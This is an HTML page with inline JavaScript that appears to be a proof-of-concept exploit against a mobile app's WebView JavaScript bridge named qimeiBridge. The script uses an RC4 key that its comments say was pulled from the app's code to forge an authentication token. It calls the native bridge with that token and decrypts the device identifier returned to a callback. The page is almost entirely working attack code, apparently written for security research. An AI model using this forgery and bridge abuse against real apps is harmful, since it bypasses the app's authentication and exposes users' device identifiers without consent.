<!DOCTYPE html><html><head><meta charset="utf-8"><title>P8QIMEIFORGE</title>
<style>body{background:#fff;color:#000;font:12px monospace;word-break:break-all;margin:4px}</style>
</head><body><div id="out">== P8 QIMEI RC4 FORGE ==</div>
<script>
function w(t){document.getElementById('out').innerHTML += '<br>'+String(t).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
w('URL='+location.href);
// RC4 (标准 KSA+PRGA)
function rc4(keyBytes, data){
  var S=[],j=0,i=0,out=[];
  for(var k=0;k<256;k++)S[k]=k;
  for(var k=0;k<256;k++){j=(j+S[k]+keyBytes[k%keyBytes.length])&0xff;var t=S[k];S[k]=S[j];S[j]=t;}
  j=0;
  for(var k=0;k<data.length;k++){i=(i+1)&0xff;j=(j+S[i])&0xff;var t=S[i];S[i]=S[j];S[j]=t;out.push(data.charCodeAt(k)^S[(S[i]+S[j])&0xff]);}
  var s='';for(var k=0;k<out.length;k++)s+=('0'+out[k].toString(16)).slice(-2);
  return s;
}
function hexToBytes(h){var b=[];for(var i=0;i<h.length;i+=2)b.push(parseInt(h.substr(i,2),16));return b;}
function rc4dec(keyBytes, hexStr){
  var ct=hexToBytes(hexStr);
  var S=[],j=0,i=0,out=[];
  for(var k=0;k<256;k++)S[k]=k;
  for(var k=0;k<256;k++){j=(j+S[k]+keyBytes[k%keyBytes.length])&0xff;var t=S[k];S[k]=S[j];S[j]=t;}
  j=0;
  for(var k=0;k<ct.length;k++){i=(i+1)&0xff;j=(j+S[i])&0xff;var t=S[i];S[i]=S[j];S[j]=t;out.push(ct[k]^S[(S[i]+S[j])&0xff]);}
  var s='';for(var k=0;k<out.length;k++)s+=String.fromCharCode(out[k]);
  return s;
}
// 硬编码密钥（dex 提取）
var KEY=[];
var keyStr='35b4cfe6f7eae7acbd7bace522d0db54';
for(var i=0;i<keyStr.length;i++)KEY.push(keyStr.charCodeAt(i));
// 伪造 token：appKey-time
var appKey='attacker-p8-demo';
var time=Math.floor(Date.now()/1000);
var token=rc4(KEY, appKey+'-'+time);
w('FORGED time='+time+' token='+token);
// 回调接收（loadUrl javascript: 注入 window.qimeiCallback）
window.qimeiCallback=function(payload){
  w('QIMEI_CB_RAW('+typeof payload+')='+String(payload).slice(0,200));
  try{
    var dec=rc4dec(KEY,String(payload));
    w('QIMEI_DECRYPTED='+dec);
  }catch(e){w('CB_DEC_ERR:'+e.message);}
  return 'ok';
};
// 发起 bridge 调用
try{
  if(window.qimeiBridge&&window.qimeiBridge.postMessage){
    var r=window.qimeiBridge.postMessage(JSON.stringify({handlerName:'qimei',appKey:appKey,time:String(time),token:token}));
    w('SYNC_RESP='+String(r).slice(0,200));
  } else { w('NO qimeiBridge object'); }
}catch(e){w('CALL_ERR:'+e.message);}
w('== P8 DONE ==');
</script></body></html>
